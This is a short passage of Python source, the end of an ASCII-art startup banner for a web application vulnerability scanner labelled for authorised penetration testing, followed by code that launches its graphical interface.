    ██████╔╝███████╗██║  ██║███████║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    
                        Advanced Web Application Vulnerability Scanner v2.0
                            For Authorized Penetration Testing Only
    """)
    
    app = BeastScannerGUI()
    app.run()


if __name__ == "__main__":
    main()
